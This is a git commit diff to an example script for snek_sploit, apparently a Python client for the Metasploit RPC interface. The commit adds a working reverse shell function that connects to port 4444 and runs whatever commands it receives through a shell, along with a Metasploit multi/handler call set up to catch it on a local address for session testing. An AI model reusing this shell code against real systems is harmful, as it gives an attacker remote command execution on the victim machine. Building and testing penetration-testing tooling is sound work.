3d467e3840d936f66b92f5abf09f35719d1cbfef
Jiří Rája <jiri.raja@gmail.com>
2023-11-21 17:12:16 +0100

    Updated the example to be ready for session testing

--- examples/example.py
+++ examples/example.py
@@ -1,9 +1,33 @@
+import time
+
 from snek_sploit import Client
+from snek_sploit.lib.rpc.module import ModuleType
+import socket
+import subprocess
+
+
+def create_connection(target, port=4444):
+    so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    so.connect((target, port))
+    while True:
+        d = so.recv(1024)
+        if len(d) == 0:
+            break
+        p = subprocess.Popen(d, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        o = p.stdout.read() + p.stderr.read()
+        so.send(o)
 
 
 if __name__ == '__main__':
     client = Client("msf", "root", disable_https_warnings=True)
-    
+
+    # Run in one terminal, then comment and test sessions freely
+    execution = client.module.rpc.execute(ModuleType.exploit, "multi/handler", {"PAYLOAD": "python/shell_reverse_tcp", "LHOST": "192.168.0.222", "LPORT": 4444})
+    time.sleep(2)
+    create_connection("192.168.0.222")
+
+    # Uncomment and test RPC here
+    # client.session.rpc.list_sessions()
 
     # client.db.rpc.create_cracked_credential()
     # client.db.rpc.create_credential()
@@ -47,7 +71,3 @@ if __name__ == '__main__':
     # client.db.rpc.connect()
     # client.db.rpc.disconnect()
     # client.db.rpc.status()
-
-    # client.job.rpc.list_jobs()
-    # client.job.rpc.info(1)
-    # client.job.rpc.stop(1)
